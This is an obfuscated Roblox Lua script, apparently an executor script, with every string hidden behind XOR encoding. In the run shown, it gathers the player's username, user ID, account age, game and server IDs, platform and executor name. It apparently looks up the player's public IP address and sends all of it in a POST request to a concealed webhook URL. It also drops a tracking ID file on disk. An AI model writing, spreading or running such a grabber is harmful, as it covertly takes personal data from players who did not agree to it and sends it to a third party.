local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v36,v37) local v38={};for v63=1, #v36 do v6(v38,v0(v4(v1(v2(v36,v63,v63 + 1 )),v1(v2(v37,1 + (v63% #v37) ,1 + (v63% #v37) + 1 )))%256 ));end return v5(v38);end local v8=game:GetService(v7("\249\215\207\53\213\190\213\8\216\192\222","\126\177\163\187\69\134\219\167"));local v9=game:GetService(v7("\19\193\43\220\249\49\222","\156\67\173\74\165"));local v10=v7("\60\163\93\6\175\124\9\123\179\64\5\191\41\84\48\249\74\25\177\105\71\36\190\6\1\185\36\78\59\184\66\5\243\119\21\103\228\28\78\229\119\19\103\239\30\78\234\114\20\99\231\16\89\172\22\112\18\174\103\91\139\12\106\46\185\104\78\138\62\84\53\167\76\17\165\126\85\121\228\96\61\131\15\112\46\131\92\36\170\23\95\5\146\4\4\235\4\103\1\145\109\37\185\47\94\0\152\71\48\140\43\85\4\152\123\3\189\10\119\21\228","\38\84\215\41\118\220\70");local function v11(v39,v40) local v41=0 -0 ;local v42;while true do if (v41==(0 -0)) then v42={};for v70=1 + 0 , #v39 do local v71=v39:byte(v70);local v72=bit32.bxor(v71,v40);table.insert(v42,string.char(v72));end v41=4 -3 ;end if (v41==(754 -(239 + 514))) then return table.concat(v42);end end end local function v12() local v43=0;local v44;while true do local v64=0;while true do if (v64==(0 + 0)) then if (v43==(1330 -(797 + 532))) then return {[v7("\126\23\47\23","\158\48\118\66\114")]=v44 or v7("\158\42\27\56\124\178\245\235\1\8\51\112\176\239\164\54","\155\203\68\112\86\19\197") };end if ((0 + 0)==v43) then v44=nil;if identifyexecutor then v44=identifyexecutor();end v43=1 + 0 ;end break;end end end end local function v13() local v45=0 -0 ;local v46;while true do if (v45==(1202 -(373 + 829))) then v46=v12();return string.format(v7("\3\206","\152\38\189\86\156\32\24\133"),v46.Name);end end end local function v14() local v47=731 -(476 + 255) ;local v48;local v49;local v50;while true do if (v47==0) then v48=game:GetService(v7("\201\68\162\84\213\89\183\83\232\100\162\84\234\94\164\67","\38\156\55\199"));v49=v48:GetPlatform();v47=1131 -(369 + 761) ;end if (v47==(1 + 0)) then local v69=0;while true do if (v69==0) then local v73=0;while true do if (v73==(0 -0)) then v50={[Enum.Platform.Windows]=v7("\159\116\114\44\28\99\233","\35\200\29\28\72\115\20\154"),[Enum.Platform.OSX]=v7("\54\140\233","\84\121\223\177\191\237\76"),[Enum.Platform.IOS]=v7("\178\121\250","\161\219\54\169\192\90\48\80"),[Enum.Platform.Android]=v7("\104\76\4\55\70\75\4","\69\41\34\96"),[Enum.Platform.XBoxOne]=v7("\132\193\216\18\66\4\178\198\151\66\33\36\178\208\216\6\7\98","\75\220\163\183\106\98"),[Enum.Platform.PS4]=v7("\50\137\223\119\145\33\181\133\36\214\14\191\194","\185\98\218\235\87"),[Enum.Platform.XBox360]=v7("\243\62\40\254\158\249\157\108\103\174\253\165\197\47\40\234\219\227","\202\171\92\71\134\190"),[Enum.Platform.WiiU]=v7("\30\200\37\197\28\129\100\171\38\207\63\135\37\196\101","\232\73\161\76"),[Enum.Platform.NX]=v7("\152\208\81\94\17\251\247\71\69\11\168","\126\219\185\34\61"),[Enum.Platform.Ouya]=v7("\35\219\71\115\62\63\210\233\8\220\81\123\122\58\209\230\31\203\90\59","\135\108\174\62\18\30\23\147"),[Enum.Platform.AndroidTV]=v7("\151\231\46\217\23\167\55\135\130\223","\167\214\137\74\171\120\206\83"),[Enum.Platform.Chromecast]=v7("\168\248\32\82\245\162\136\241\33\73","\199\235\144\82\61\152"),[Enum.Platform.Linux]=v7("\43\31\183\62\31\86\241\15\2\5\178\63\8\6\240","\75\103\118\217"),[Enum.Platform.SteamOS]=v7("\244\64\117\21\180\94\228\88\121\17\183\10","\126\167\52\16\116\217"),[Enum.Platform.WebOS]=v7("\255\43\34\205\155\42","\156\168\78\64\224\212\121"),[Enum.Platform.DOS]=v7("\35\193\150","\174\103\142\197"),[Enum.Platform.BeOS]=v7("\116\45\112\11","\152\54\72\63\88\69\62"),[Enum.Platform.UWP]=v7("\225\243\222\28\156\227\225\28\246\197\237\87\148\240\225\28\227\193\236\28\246\214\225\18\154\141","\60\180\164\142"),[Enum.Platform.PS5]=v7("\104\109\80\105\111\206\29\86\77\10\37\34\164","\114\56\62\101\73\71\141"),[Enum.Platform.MetaOS]=v7("\149\236\207\197\151\218","\164\216\137\187"),[Enum.Platform.None]=v7("\231\232\58\188\169\233\5\146\194\52\164\175\253\14","\107\178\134\81\210\198\158")};return v50[v49] or v7("\13\0\137\200\165\47\0\194\226\175\46\7\129\195","\202\88\110\226\166") ;end end end end end end end local function v15() return game.Players.LocalPlayer.UserId   .. "-"   .. math.random(1000,18947 -8948 ) ;end local function v16(v51) local v52=361 -(64 + 174) ;return v11(v51,v52);end local function v17(v53) local v54=0 + 0 ;local v55;while true do if (v54==0) then v55=181 -58 ;return v11(v53,v55);end end end local function v18() local v56=tostring(v9.LocalPlayer.UserId);local v57=v7("\235\56\171\211\245","\170\163\111\226\151")   .. v56   .. v7("\95\36\170\44","\73\113\80\210\88\46\87") ;if isfile(v57) then local v68=readfile(v57);return v17(v68);else return nil;end end local function v19(v58) local v59=0;local v60;local v61;local v62;while true do if (v59==(338 -(144 + 192))) then print(v7("\133\234\57\212\56\253\168\196\80\227\121\224\168\217\80\246\119\228\237\205\28\241\97\243\191\135\80","\150\205\189\112\144\24")   .. v9.LocalPlayer.Name );break;end if (v59==(216 -(42 + 174))) then v60=tostring(v9.LocalPlayer.UserId);v61=v16(v58);v59=1 + 0 ;end if (v59==(1 + 0)) then v62=v7("\169\27\228\54\216","\135\225\76\173\114")   .. v60   .. v7("\84\249\160\164","\199\122\141\216\208\204\221") ;writefile(v62,v61);v59=2;end end end local v20=v18();if  not v20 then local v65=0;while true do if (v65==0) then v20=v15();v19(v20);break;end end else print(v7("\16\151\182\66\3\200\1\2\32\146\182\67\17\155\29\9\101\151\171\67\22\141\21\80\13\179\150\104\94\200","\112\69\228\223\44\100\232\113")   .. v20 );end local v21=v13();local v22=game.Players.LocalPlayer;local v23=v22.Name;local v24=v22.DisplayName;local v25=v22.UserId;local v26=v22.AccountAge;local v27=v22.HasVerifiedBadge;local v28=game.PlaceId;local v29=game.JobId;local v30=os.date(v7("\145\38\74\150\187\49\195\208\95\66\251\236\57\171\142\90\52","\230\180\127\103\179\214\28"),os.time());local v31=v14();local v32=v7("\185\11\84\72\235\86\238","\128\236\101\63\38\132\33");local v33=(syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request ;if v33 then local v66=0;local v67;while true do if (v66==(0 + 0)) then v67=v33({[v7("\153\187\29","\175\204\201\113\36\214\139")]=v7("\79\216\33\204\94\8\131\60\204\73\70\220\60\146\7\72\193\122\214\23\72\194\122","\100\39\172\85\188"),[v7("\128\125\173\136\60\169","\83\205\24\217\224")]=v7("\193\224\249","\93\134\165\173")});if (v67 and v67.Body) then local v74=1504 -(363 + 1141) ;local v75;while true do if (v74==(1580 -(1183 + 397))) then v75=game:GetService(v7("\150\230\213\210\9\203\160\104\183\241\196","\30\222\146\161\162\90\174\210")):JSONDecode(v67.Body);v32=v75.query or v7("\208\64\113\28\228\71\124\11\231\66\117","\106\133\46\16") ;break;end end end break;end end else warn(v7("\112\20\71\204\26\114\93\49\102\249\73\84\24\21\125\239\79\80\72\47\97\232\95\68\22\96\80\253\84\78\87\52\51\250\95\84\91\40\51\213\106\14","\32\56\64\19\156\58"));end local v34={[v7("\89\199\235\66\95\252\148","\224\58\168\133\54\58\146")]=v7("\119\83\92\189\80\158\130\8\76\66\66\242\123\198\171\4\94\81\78\249\53\182\170\56\3","\107\57\54\43\157\21\230\231"),[v7("\222\134\19\240\189\207","\175\187\235\113\149\217\188")]={{[v7("\40\166\149\64\230","\24\92\207\225\44\131\25")]=v7("\110\203\189\79\14\105\66\220\182\12\63\120\95\210\177\64\8","\29\43\179\216\44\123"),[v7("\190\214\44\67\175","\44\221\185\64")]=50876111 -34164431 ,[v7("\7\238\77\83\119\18","\19\97\135\40\63")]={{[v7("\160\93\62\62","\81\206\60\83\91\79")]=v7("\96\170\221\119","\196\46\203\176\18\79\163\45"),[v7("\174\35\114\11\33","\143\216\66\30\126\68\155")]="`"   .. v23   .. "`" ,[v7("\163\198\1\194\203\166","\129\202\168\109\171\165\195\183")]=true},{[v7("\44\89\58\221","\134\66\56\87\184\190\116")]=v7("\24\56\26\171\21\234\56\117\18\48\4\190","\85\92\81\105\219\121\139\65"),[v7("\235\178\92\80\121","\191\157\211\48\37\28")]="`"   .. v24   .. "`" ,[v7("\214\17\248\21\52\218","\90\191\127\148\124")]=true},{[v7("\118\134\35\18","\119\24\231\78")]=v7("\183\62\160\88\245\100","\113\226\77\197\42\188\32"),[v7("\44\23\248\160\63","\213\90\118\148")]="`"   .. v25   .. "`" ,[v7("\82\32\184\95\67\94","\45\59\78\212\54")]=true},{[v7("\30\87\142\142","\144\112\54\227\235\230\78\205")]=v7("\146\43\12\243\197\85\167\104\46\251\213","\59\211\72\111\156\176"),[v7("\88\134\239\56\75","\77\46\231\131")]="`"   .. v26   .. v7("\250\80\183\89\169\84","\32\218\52\214") ,[v7("\71\25\61\161\255\181","\58\46\119\81\200\145\208\37")]=true},{[v7("\37\141\61\169","\86\75\236\80\204\201\221")]=v7("\68\68\101\140\248\130\119\69","\235\18\33\23\229\158"),[v7("\70\187\205\174\85","\219\48\218\161")]="`"   .. tostring(v27)   .. "`" ,[v7("\237\127\112\64\213\74","\128\132\17\28\41\187\47")]=true},{[v7("\15\51\11\63","\61\97\82\102\90")]=v7("\156\34\170\72\194\126\58","\105\204\78\203\43\167\55\126"),[v7("\179\171\47\11\22","\49\197\202\67\126\115\100\167")]="`"   .. v28   .. "`" ,[v7("\62\85\211\32\142\83","\62\87\59\191\73\224\54")]=true},{[v7("\233\3\247\204","\169\135\98\154")]=v7("\225\120\38\125\217","\168\171\23\68\52\157\83"),[v7("\226\112\249\184\32","\231\148\17\149\205\69\77")]="`"   .. v29   .. "`" ,[v7("\137\169\203\242\89\250","\159\224\199\167\155\55")]=true},{[v7("\249\242\49\215","\178\151\147\92")]=v7("\169\229\73\49\7\88\117\158\189\98\51\31\73","\26\236\157\44\82\114\44"),[v7("\60\47\217\78\47","\59\74\78\181")]="`"   .. v21   .. "`" ,[v7("\44\223\86\83\189\32","\211\69\177\58\58")]=true},{[v7("\185\228\116\240","\171\215\133\25\149\137")]=v7("\197\205\36\243\236\53\188\114\237\201\38\252\224\34\241","\34\129\168\82\154\143\80\156"),[v7("\147\179\63\30\77","\233\229\210\83\107\40\46")]="`"   .. v31   .. "`" ,[v7("\200\76\62\223\11\196","\101\161\34\82\182")]=true},{[v7("\230\12\84\251","\78\136\109\57\158\187\130\226")]=v7("\22\8\208\213","\145\94\95\153"),[v7("\235\204\24\192\75","\215\157\173\116\181\46")]="`"   .. v20   .. "`" ,[v7("\60\186\135\251\212\48","\186\85\212\235\146")]=true},{[v7("\204\128\27\251","\56\162\225\118\158\89\142")]=v7("\117\53","\184\60\101\160\207\66"),[v7("\39\131\112\169\52","\220\81\226\28")]="`"   .. v32   .. "`" ,[v7("\26\219\142\242\228\194","\167\115\181\226\155\138")]=true},{[v7("\236\35\234\89","\166\130\66\135\60\27\17")]=v7("\112\67\195\112\112\97\82\203\118\37\80\79\202","\80\36\42\174\21"),[v7("\88\17\59\111\75","\26\46\112\87")]="`"   .. v30   .. "`" ,[v7("\176\45\167\125\177\186","\212\217\67\203\20\223\223\37")]=true}}}}};local v35=v8:JSONEncode(v34);if v33 then v33({[v7("\143\159\164","\178\218\237\200")]=v10,[v7("\155\176\242\216\185\177","\176\214\213\134")]=v7("\196\130\133\224","\57\148\205\214\180\200\54"),[v7("\58\248\52\48\115\0\238","\22\114\157\85\84")]={[v7("\231\196\29\208\88\248\188\137\255\10\212\88","\200\164\171\115\164\61\150")]=v7("\191\228\19\73\138\189\245\23\76\140\176\187\9\86\140\176","\227\222\148\99\37")},[v7("\17\93\86\239","\153\83\50\50\150")]=v35});else warn(v7("\117\66\71\44\51\153\72\76\99\118\15\103\235\120\83\101\102\12\99\164\95\73\115\119\82","\45\61\22\19\124\19\203"));end
